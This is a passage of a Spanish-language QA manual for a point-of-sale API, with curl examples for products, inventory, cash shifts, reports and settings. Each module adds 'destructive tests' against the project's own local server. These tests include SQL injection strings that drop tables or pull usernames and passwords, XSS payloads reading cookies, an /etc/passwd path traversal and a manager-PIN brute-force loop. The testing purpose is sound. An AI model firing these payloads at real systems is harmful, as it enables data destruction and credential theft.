  -H "Authorization: Bearer $TOKEN"
```

### 5.7 Listar Categorias

**Endpoint:** `GET /api/v1/products/categories/list`

```bash
curl http://localhost:8000/api/v1/products/categories/list \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": ["Alimentos", "Bebidas", "Higiene", "Limpieza"]
}
```

### 5.8 Productos con Stock Bajo

**Endpoint:** `GET /api/v1/products/low-stock`

```bash
curl "http://localhost:8000/api/v1/products/low-stock?limit=20" \
  -H "Authorization: Bearer $TOKEN"
```

### 5.9 Stock por Sucursal

**Endpoint:** `GET /api/v1/products/{product_id}/stock-by-branch`

```bash
curl http://localhost:8000/api/v1/products/1/stock-by-branch \
  -H "Authorization: Bearer $TOKEN"
```

### 5.10 Actualizar Precio Remoto

**Endpoint:** `POST /api/v1/products/price`

```bash
curl -X POST http://localhost:8000/api/v1/products/price \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "SHAM-001", "new_price": 94.90}'
```

### 5.11 Prueba en Frontend

1. Presionar **F3** para ir al modulo de productos
2. Buscar un producto por nombre o SKU
3. Crear un producto nuevo con todos los campos
4. Editar el precio de un producto existente
5. Verificar que la categoria aparece en la lista de categorias
6. Verificar la lista de productos con stock bajo

### 5.12 Pruebas Destructivas (Intentar Romper)

**SKU con caracteres especiales:**

```bash
# SKU con inyeccion SQL
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "'; DROP TABLE products;--", "name": "Test", "price": 10}'

# SKU con emojis
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "🔥SKU🔥001", "name": "Test", "price": 10}'

# SKU vacio
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "", "name": "Test", "price": 10}'

# SKU con 1000 caracteres
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"sku\": \"$(python3 -c 'print("X"*1000)')\", \"name\": \"Test\", \"price\": 10}"

# SKU con espacios, tabs, newlines
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "SKU\t001\n002", "name": "Test", "price": 10}'
```

**Precios extremos:**

```bash
# Precio negativo
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "NEG-001", "name": "Test", "price": -99.99}'

# Precio con muchos decimales
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "DEC-001", "name": "Test", "price": 0.001}'

# Precio astronomico
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "MAX-001", "name": "Test", "price": 99999999.99}'

# Precio como string
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "STR-001", "name": "Test", "price": "cien pesos"}'

# Costo mayor que precio (margen negativo)
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "LOSS-001", "name": "Test", "price": 10, "cost": 100}'

# Tax rate invalido
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "TAX-001", "name": "Test", "price": 10, "tax_rate": -0.16}'

curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "TAX-002", "name": "Test", "price": 10, "tax_rate": 5.0}'
```

**Nombre del producto con XSS:**

```bash
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "XSS-001", "name": "<script>alert(document.cookie)</script>", "price": 10}'

curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "XSS-002", "name": "Producto\"><img src=x onerror=alert(1)>", "price": 10}'
```

**Stock invalido:**

```bash
# Stock negativo directo
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "NEG-STK", "name": "Test", "price": 10, "stock": -50}'

# min_stock mayor que max_stock
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "MINMAX", "name": "Test", "price": 10, "min_stock": 200, "max_stock": 10}'
```

**Barcode duplicado o invalido:**

```bash
# Barcode con letras y simbolos
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "BAR-001", "name": "Test", "price": 10, "barcode": "ABC-NOT-VALID!!!"}'

# Barcode extremadamente largo
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"sku\": \"BAR-002\", \"name\": \"Test\", \"price\": 10, \"barcode\": \"$(python3 -c 'print(\"9\"*500)')\"}"
```

**RBAC: Cajero intenta crear producto:**

```bash
# Obtener token de cajero y luego intentar crear producto
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_CAJERO" \
  -d '{"sku": "HACK-001", "name": "Test", "price": 10}'
# Debe retornar 403 Forbidden
```

---

## 6. Modulo Inventario (F4)

### 6.1 Listar Movimientos de Inventario

**Endpoint:** `GET /api/v1/inventory/movements`

```bash
# Todos los movimientos recientes
curl "http://localhost:8000/api/v1/inventory/movements?limit=20" \
  -H "Authorization: Bearer $TOKEN"

# Movimientos de un producto especifico
curl "http://localhost:8000/api/v1/inventory/movements?product_id=1&limit=10" \
  -H "Authorization: Bearer $TOKEN"

# Solo entradas
curl "http://localhost:8000/api/v1/inventory/movements?movement_type=IN" \
  -H "Authorization: Bearer $TOKEN"
```

### 6.2 Ajustar Stock

**Endpoint:** `POST /api/v1/inventory/adjust`

> **RBAC:** Solo `admin`, `manager`, `owner`, `gerente`, `dueño`.

**Agregar stock (entrada de mercancia):**

```bash
curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "product_id": 1,
    "quantity": 50,
    "reason": "Recepcion de mercancia - Factura F-2024-001"
  }'
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "product_id": 1,
    "previous_stock": 25.0,
    "adjustment": 50.0,
    "new_stock": 75.0
  }
}
```

**Restar stock (merma, danio, conteo fisico):**

```bash
curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "product_id": 1,
    "quantity": -3,
    "reason": "Conteo fisico - diferencia detectada"
  }'
```

**Verificaciones:**
- Usa `FOR UPDATE` para prevenir condiciones de carrera
- No permite stock negativo resultante
- Registra automaticamente un `inventory_movement` para auditoria
- `quantity` positiva = entrada, negativa = salida

### 6.3 Actualizar Stock Remoto (por SKU)

**Endpoint:** `POST /api/v1/products/stock`

```bash
curl -X POST http://localhost:8000/api/v1/products/stock \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "sku": "SHAM-001",
    "quantity": 20,
    "operation": "add",
    "reason": "Restock semanal"
  }'
```

**Operaciones validas:** `add`, `subtract`, `set`

### 6.4 Alertas de Stock Bajo

**Endpoint:** `GET /api/v1/inventory/alerts`

```bash
curl http://localhost:8000/api/v1/inventory/alerts \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": [
    {
      "id": 5,
      "sku": "SHAM-001",
      "name": "Shampoo Anticaspa 400ml",
      "stock": 3.0,
      "min_stock": 10.0,
      "category": "Higiene",
      "alert_type": "low_stock"
    }
  ]
}
```

**Tipos de alerta:** `low_stock` (por debajo del minimo) y `out_of_stock` (stock = 0).

### 6.5 Prueba en Frontend

1. Presionar **F4** para ir al modulo de inventario
2. Ver la lista de movimientos recientes
3. Realizar un ajuste de inventario (agregar stock)
4. Verificar que el stock del producto se actualizo
5. Realizar un ajuste negativo y verificar que no permite stock < 0
6. Revisar las alertas de stock bajo

### 6.6 Pruebas Destructivas (Intentar Romper)

**Ajustes que resultan en stock negativo:**

```bash
# Intentar restar mas stock del disponible
curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 1, "quantity": -999999, "reason": "Test"}'
# Debe rechazar con error, stock no debe quedar negativo
```

**Ajustes con valores extremos:**

```bash
# Cantidad cero (no deberia hacer nada)
curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 1, "quantity": 0, "reason": "Ajuste de cero"}'

# Cantidad con muchos decimales
curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 1, "quantity": 0.00001, "reason": "Decimal extremo"}'

# Cantidad MAX_INT
curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 1, "quantity": 2147483647, "reason": "Overflow test"}'

# Quantity como string
curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 1, "quantity": "cincuenta", "reason": "String test"}'
```

**Condiciones de carrera en inventario:**

```bash
# 10 ajustes simultaneos al mismo producto
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:8000/api/v1/inventory/adjust \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"product_id": 1, "quantity": 1, "reason": "Concurrent test '$i'"}' &
done
wait
# Verificar: stock final debe ser exactamente +10 del original

# Ajuste positivo y negativo simultaneos
curl -s -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 1, "quantity": 50, "reason": "Entrada"}' &
curl -s -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 1, "quantity": -30, "reason": "Salida"}' &
wait
# Verificar: stock debe ser consistente (original + 50 - 30 = original + 20)
```

**Inyeccion en razon de ajuste:**

```bash
curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 1, "quantity": 1, "reason": "<script>alert(1)</script>"}'

curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 1, "quantity": 1, "reason": "'; DROP TABLE inventory_movements;--"}'
```

**Operacion de stock remoto invalida:**

```bash
# Operacion inexistente
curl -X POST http://localhost:8000/api/v1/products/stock \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "SHAM-001", "quantity": 20, "operation": "multiply", "reason": "Test"}'

# SKU inexistente
curl -X POST http://localhost:8000/api/v1/products/stock \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "NOEXISTE999", "quantity": 20, "operation": "add", "reason": "Test"}'

# Set stock a valor negativo
curl -X POST http://localhost:8000/api/v1/products/stock \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sku": "SHAM-001", "quantity": -100, "operation": "set", "reason": "Test"}'
```

---

## 7. Modulo Turnos (F5)

### 7.1 Abrir un Turno

**Endpoint:** `POST /api/v1/turns/open`

```bash
curl -X POST http://localhost:8000/api/v1/turns/open \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "initial_cash": 1000.00,
    "branch_id": 1,
    "notes": "Turno matutino"
  }'
```

**Respuesta esperada:**

```json
{"success": true, "data": {"id": 5, "status": "open"}}
```

**Validaciones:**
- No se puede abrir un turno si ya hay uno abierto para el mismo usuario
- `initial_cash` debe ser >= 0

### 7.2 Consultar Turno Actual

**Endpoint:** `GET /api/v1/turns/current`

```bash
curl http://localhost:8000/api/v1/turns/current \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta si hay turno abierto:**

```json
{
  "success": true,
  "data": {
    "id": 5,
    "user_id": 1,
    "initial_cash": 1000.0,
    "status": "open",
    "start_timestamp": "2026-02-24T09:00:00+00:00"
  }
}
```

**Respuesta si NO hay turno abierto:**

```json
{"success": true, "data": null}
```

### 7.3 Registrar Movimiento de Caja

**Endpoint:** `POST /api/v1/turns/{turn_id}/movements`

**Entrada de efectivo (retiro de banco, por ejemplo):**

```bash
curl -X POST http://localhost:8000/api/v1/turns/5/movements \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "amount": 500.00,
    "movement_type": "in",
    "reason": "Cambio adicional del banco"
  }'
```

**Retiro de efectivo:**

```bash
curl -X POST http://localhost:8000/api/v1/turns/5/movements \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "amount": 2000.00,
    "movement_type": "out",
    "reason": "Retiro parcial a caja fuerte",
    "manager_pin": "1234"
  }'
```

**Nota:** Cajeros (no gerentes) necesitan proporcionar `manager_pin` para movimientos de caja.

### 7.4 Ver Resumen del Turno

**Endpoint:** `GET /api/v1/turns/{turn_id}/summary`

```bash
curl http://localhost:8000/api/v1/turns/5/summary \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "turn_id": 5,
    "status": "open",
    "initial_cash": 1000.0,
    "sales_by_method": [
      {"payment_method": "cash", "count": 15, "total": 4500.0},
      {"payment_method": "card", "count": 8, "total": 3200.0}
    ],
    "total_sales": 7700.0,
    "cash_in": 500.0,
    "cash_out": 2000.0,
    "expenses": 150.0,
    "expected_cash": 3850.0
  }
}
```

### 7.5 Cerrar Turno con Conteo de Efectivo

**Endpoint:** `POST /api/v1/turns/{turn_id}/close`

```bash
curl -X POST http://localhost:8000/api/v1/turns/5/close \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "final_cash": 3825.00,
    "notes": "Diferencia de -$25 por redondeos",
    "denominations": [
      {"denomination": 1000, "count": 3},
      {"denomination": 500, "count": 1},
      {"denomination": 200, "count": 1},
      {"denomination": 100, "count": 1},
      {"denomination": 20, "count": 1},
      {"denomination": 5, "count": 1}
    ]
  }'
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "id": 5,
    "status": "closed",
    "expected_cash": 3850.0,
    "final_cash": 3825.0,
    "difference": -25.0
  }
}
```

**Verificaciones:**
- `expected_cash` = initial_cash + ventas_efectivo + entradas - salidas - gastos
- `difference` = final_cash - expected_cash
- Diferencia positiva = sobrante, negativa = faltante
- El conteo por denominaciones es opcional pero recomendado
- Solo el dueno del turno o un gerente+ puede cerrarlo

### 7.6 Prueba en Frontend

1. Presionar **F5** para ir al modulo de turnos
2. Abrir un turno ingresando el efectivo inicial
3. Realizar varias ventas (regresar con F1)
4. Regresar a F5 y ver el resumen del turno
5. Hacer un retiro de efectivo (salida)
6. Cerrar el turno con conteo de denominaciones
7. Verificar que la diferencia (sobrante/faltante) es correcta
8. Intentar abrir un segundo turno (debe fallar)

### 7.7 Pruebas Destructivas (Intentar Romper)

**Efectivo inicial invalido:**

```bash
# Efectivo negativo
curl -X POST http://localhost:8000/api/v1/turns/open \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"initial_cash": -500, "branch_id": 1}'

# Efectivo como string
curl -X POST http://localhost:8000/api/v1/turns/open \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"initial_cash": "mil pesos", "branch_id": 1}'

# Efectivo astronomico
curl -X POST http://localhost:8000/api/v1/turns/open \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"initial_cash": 99999999999.99, "branch_id": 1}'
```

**Abrir turno duplicado:**

```bash
# Intentar abrir dos turnos rapidamente (race condition)
curl -s -X POST http://localhost:8000/api/v1/turns/open \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"initial_cash": 1000, "branch_id": 1}' &
curl -s -X POST http://localhost:8000/api/v1/turns/open \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"initial_cash": 1000, "branch_id": 1}' &
wait
# Solo UNO debe tener exito
```

**Cerrar turno que no es tuyo:**

```bash
# Cajero A abre turno, Cajero B intenta cerrarlo
curl -X POST http://localhost:8000/api/v1/turns/5/close \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_OTRO_CAJERO" \
  -d '{"final_cash": 1000}'
# Debe fallar a menos que sea gerente+
```

**Cerrar turno ya cerrado:**

```bash
curl -X POST http://localhost:8000/api/v1/turns/5/close \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"final_cash": 1000}'
# Segunda vez, debe retornar error
```

**Movimiento de caja con monto invalido:**

```bash
# Monto cero
curl -X POST http://localhost:8000/api/v1/turns/5/movements \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 0, "movement_type": "in", "reason": "Test"}'

# Monto negativo
curl -X POST http://localhost:8000/api/v1/turns/5/movements \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": -500, "movement_type": "in", "reason": "Test"}'

# movement_type invalido
curl -X POST http://localhost:8000/api/v1/turns/5/movements \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 500, "movement_type": "steal", "reason": "Test"}'
```

**PIN de gerente - fuerza bruta:**

```bash
# Intentar 50 PINs diferentes rapidamente
for pin in $(seq 0000 0050); do
  curl -s -X POST http://localhost:8000/api/v1/turns/5/movements \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN_CAJERO" \
    -d "{\"amount\": 500, \"movement_type\": \"out\", \"reason\": \"Test\", \"manager_pin\": \"$pin\"}"
done
# Debe haber rate limiting o bloqueo despues de N intentos
```

**Denominaciones invalidas en cierre:**

```bash
# Denominacion negativa
curl -X POST http://localhost:8000/api/v1/turns/5/close \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"final_cash": 1000, "denominations": [{"denomination": -100, "count": 10}]}'

# Count negativo
curl -X POST http://localhost:8000/api/v1/turns/5/close \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"final_cash": 1000, "denominations": [{"denomination": 100, "count": -5}]}'

# Denominacion que no existe (ej. billete de $3)
curl -X POST http://localhost:8000/api/v1/turns/5/close \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"final_cash": 1000, "denominations": [{"denomination": 3, "count": 333}]}'

# Suma de denominaciones NO coincide con final_cash
curl -X POST http://localhost:8000/api/v1/turns/5/close \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"final_cash": 5000, "denominations": [{"denomination": 100, "count": 1}]}'
```

---

## 8. Modulo Reportes (F6)

### 8.1 Resumen Diario de Ventas

**Endpoint:** `GET /api/v1/sales/reports/daily-summary`

```bash
curl "http://localhost:8000/api/v1/sales/reports/daily-summary?limit=7" \
  -H "Authorization: Bearer $TOKEN"
```

### 8.2 Ranking de Productos

**Endpoint:** `GET /api/v1/sales/reports/product-ranking`

```bash
curl "http://localhost:8000/api/v1/sales/reports/product-ranking?limit=20" \
  -H "Authorization: Bearer $TOKEN"
```

### 8.3 Mapa de Calor por Horas

**Endpoint:** `GET /api/v1/sales/reports/hourly-heatmap`

```bash
curl http://localhost:8000/api/v1/sales/reports/hourly-heatmap \
  -H "Authorization: Bearer $TOKEN"
```

### 8.4 Buscar Ventas por Folio o Fecha

**Endpoint:** `GET /api/v1/sales/search`

```bash
# Por folio
curl "http://localhost:8000/api/v1/sales/search?folio=A1-000042" \
  -H "Authorization: Bearer $TOKEN"

# Por rango de fechas
curl "http://localhost:8000/api/v1/sales/search?date_from=2026-02-01&date_to=2026-02-24" \
  -H "Authorization: Bearer $TOKEN"
```

### 8.5 Listar Ventas con Filtros

**Endpoint:** `GET /api/v1/sales/`

```bash
# Ventas completadas
curl "http://localhost:8000/api/v1/sales/?status=completed&limit=20" \
  -H "Authorization: Bearer $TOKEN"

# Ventas de un cliente especifico
curl "http://localhost:8000/api/v1/sales/?customer_id=1&limit=10" \
  -H "Authorization: Bearer $TOKEN"

# Ventas canceladas
curl "http://localhost:8000/api/v1/sales/?status=cancelled" \
  -H "Authorization: Bearer $TOKEN"

# Por rango de fechas
curl "http://localhost:8000/api/v1/sales/?start_date=2026-02-20&end_date=2026-02-24" \
  -H "Authorization: Bearer $TOKEN"
```

### 8.6 Prueba en Frontend

1. Presionar **F6** para ir a reportes
2. Ver el resumen de ventas del dia
3. Filtrar por rango de fechas
4. Verificar que los totales coinciden con las ventas realizadas
5. Revisar el ranking de productos mas vendidos

### 8.7 Pruebas Destructivas (Intentar Romper)

**Fechas invalidas:**

```bash
# Fecha inicio despues de fecha fin
curl "http://localhost:8000/api/v1/sales/search?date_from=2026-12-31&date_to=2026-01-01" \
  -H "Authorization: Bearer $TOKEN"

# Fechas en formato invalido
curl "http://localhost:8000/api/v1/sales/search?date_from=31-02-2026&date_to=abc" \
  -H "Authorization: Bearer $TOKEN"

# Fecha imposible (30 de febrero)
curl "http://localhost:8000/api/v1/sales/search?date_from=2026-02-30" \
  -H "Authorization: Bearer $TOKEN"

# Rango de 10 anos (rendimiento)
curl "http://localhost:8000/api/v1/sales/search?date_from=2016-01-01&date_to=2026-12-31" \
  -H "Authorization: Bearer $TOKEN"

# Fecha del ano 9999
curl "http://localhost:8000/api/v1/sales/search?date_from=9999-12-31" \
  -H "Authorization: Bearer $TOKEN"

# Fecha negativa
curl "http://localhost:8000/api/v1/sales/search?date_from=-001-01-01" \
  -H "Authorization: Bearer $TOKEN"
```

**Inyeccion en folio:**

```bash
curl "http://localhost:8000/api/v1/sales/search?folio=' OR 1=1--" \
  -H "Authorization: Bearer $TOKEN"

curl "http://localhost:8000/api/v1/sales/search?folio=<script>alert(1)</script>" \
  -H "Authorization: Bearer $TOKEN"
```

**Paginacion abusiva:**

```bash
# Limit extremo
curl "http://localhost:8000/api/v1/sales/?limit=999999" \
  -H "Authorization: Bearer $TOKEN"

# Limit negativo
curl "http://localhost:8000/api/v1/sales/?limit=-1" \
  -H "Authorization: Bearer $TOKEN"

# Offset negativo
curl "http://localhost:8000/api/v1/sales/?offset=-10" \
  -H "Authorization: Bearer $TOKEN"

# Limit cero
curl "http://localhost:8000/api/v1/sales/?limit=0" \
  -H "Authorization: Bearer $TOKEN"

# Limit como string
curl "http://localhost:8000/api/v1/sales/?limit=abc" \
  -H "Authorization: Bearer $TOKEN"
```

**Status inexistente:**

```bash
curl "http://localhost:8000/api/v1/sales/?status=hacked" \
  -H "Authorization: Bearer $TOKEN"

curl "http://localhost:8000/api/v1/sales/?status=' OR '1'='1" \
  -H "Authorization: Bearer $TOKEN"
```

---

## 9. Modulo Historial (F7)

### 9.1 Buscar Tickets

```bash
# Buscar por folio
curl "http://localhost:8000/api/v1/sales/search?folio=A1-000042" \
  -H "Authorization: Bearer $TOKEN"
```

### 9.2 Ver Detalle de un Ticket

```bash
curl http://localhost:8000/api/v1/sales/42 \
  -H "Authorization: Bearer $TOKEN"
```

**La respuesta incluye todos los items de la venta para reimprimir el ticket.**

### 9.3 Ver Eventos de Auditoria de una Venta

**Endpoint:** `GET /api/v1/sales/{sale_id}/events`

```bash
curl http://localhost:8000/api/v1/sales/42/events \
  -H "Authorization: Bearer $TOKEN"
```

### 9.4 Prueba en Frontend

1. Presionar **F7** para ir al historial
2. Buscar un ticket por numero de folio
3. Buscar ventas por rango de fechas
4. Abrir el detalle de una venta
5. Verificar que se pueden reimprimir tickets
6. Verificar que las ventas canceladas se muestran con su estado

### 9.5 Pruebas Destructivas (Intentar Romper)

**Acceso a ventas inexistentes:**

```bash
# Sale ID que no existe
curl http://localhost:8000/api/v1/sales/99999999 \
  -H "Authorization: Bearer $TOKEN"

# Sale ID negativo
curl http://localhost:8000/api/v1/sales/-1 \
  -H "Authorization: Bearer $TOKEN"

# Sale ID como string
curl http://localhost:8000/api/v1/sales/abc \
  -H "Authorization: Bearer $TOKEN"

# Sale ID con inyeccion
curl "http://localhost:8000/api/v1/sales/1 OR 1=1" \
  -H "Authorization: Bearer $TOKEN"
```

**Manipulacion de auditoria:**

```bash
# Intentar acceder a eventos de una venta de otra sucursal (si aplica aislamiento)
# Verificar que no se pueden modificar eventos de auditoria via API
curl -X POST http://localhost:8000/api/v1/sales/42/events \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"event": "fake_event"}'
# Debe retornar 405 Method Not Allowed o 404
```

**Reimprimir ticket de venta cancelada:**

```bash
# Buscar una venta cancelada y verificar que el ticket muestra claramente "CANCELADA"
curl http://localhost:8000/api/v1/sales/42 \
  -H "Authorization: Bearer $TOKEN"
# Si status=cancelled, el frontend debe mostrar marca de agua o aviso claro
```

---

## 10. Modulo Ajustes (F8)

### 10.1 Verificar Conexion con el Servidor

```bash
curl http://localhost:8000/api/v1/sync/status \
  -H "Authorization: Bearer $TOKEN"
```

**Respuesta esperada:**

```json
{
  "status": "ok",
  "database": "connected",
  "timestamp": "2026-02-24T12:00:00+00:00"
}
```

### 10.2 Sincronizar Productos

```bash
curl http://localhost:8000/api/v1/sync/products \
  -H "Authorization: Bearer $TOKEN"
```

### 10.3 Sincronizar Clientes

```bash
curl http://localhost:8000/api/v1/sync/customers \
  -H "Authorization: Bearer $TOKEN"
```

### 10.4 Buscar Claves SAT

**Endpoint:** `GET /api/v1/sat/search?q=shampoo`

```bash
curl "http://localhost:8000/api/v1/sat/search?q=shampoo&limit=10"
```

**Respuesta esperada:**

```json
{
  "success": true,
  "data": {
    "results": [
      {"code": "53131500", "description": "Productos para el cuidado de la piel"}
    ],
    "total": 1
  }
}
```

> **Nota:** Los endpoints del catalogo SAT no requieren autenticacion.

### 10.5 Consultar Descripcion de Clave SAT

**Endpoint:** `GET /api/v1/sat/{code}`

```bash
curl http://localhost:8000/api/v1/sat/01010101
```

### 10.6 Gestion de Empleados

**Listar empleados:**

```bash
curl "http://localhost:8000/api/v1/employees/?limit=20" \
  -H "Authorization: Bearer $TOKEN"
```

**Crear empleado:**

```bash
curl -X POST http://localhost:8000/api/v1/employees/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "employee_code": "EMP-005",
    "name": "Ana Martinez Ruiz",
    "position": "cajero",
    "base_salary": 8000.00,
    "commission_rate": 0.02,
    "phone": "5554443322",
    "email": "ana@tienda.com",
    "notes": "Turno vespertino"
  }'
```

> **RBAC:** CRUD de empleados requiere rol gerente+.
> **Nota:** `employee_code` es obligatorio y debe ser unico.

**Actualizar empleado:**

```bash
curl -X PUT http://localhost:8000/api/v1/employees/5 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"base_salary": 8500.00, "notes": "Aumento trimestral"}'
```

**Desactivar empleado:**

```bash
curl -X DELETE http://localhost:8000/api/v1/employees/5 \
  -H "Authorization: Bearer $TOKEN"
```

### 10.7 Prueba en Frontend

1. Presionar **F8** para ir a ajustes/configuracion
2. Verificar la conexion con el servidor
3. Realizar una sincronizacion de productos
4. Administrar empleados (crear, editar, desactivar)
5. Buscar claves SAT para facturacion
6. Configurar parametros del sistema

### 10.8 Pruebas Destructivas (Intentar Romper)

**Inyeccion en busqueda SAT (sin auth):**

```bash
# Como los endpoints SAT no requieren auth, son un vector de ataque abierto
curl "http://localhost:8000/api/v1/sat/search?q=' UNION SELECT username,password FROM users--"
curl "http://localhost:8000/api/v1/sat/search?q=<script>alert(1)</script>"
curl "http://localhost:8000/api/v1/sat/search?q=$(python3 -c 'print("A"*10000)')"

# Codigo SAT con inyeccion
curl "http://localhost:8000/api/v1/sat/'; DROP TABLE sat_catalog;--"
curl "http://localhost:8000/api/v1/sat/../../etc/passwd"
```

**Empleados - datos invalidos:**

```bash
# Employee code duplicado
curl -X POST http://localhost:8000/api/v1/employees/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"employee_code": "EMP-005", "name": "Duplicado", "position": "cajero"}'

# Salario negativo
curl -X POST http://localhost:8000/api/v1/employees/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"employee_code": "EMP-NEG", "name": "Test", "position": "cajero", "base_salary": -5000}'

# Commission rate > 1 (100%)
curl -X POST http://localhost:8000/api/v1/employees/ \
  -H "Content-Type: application/json" \
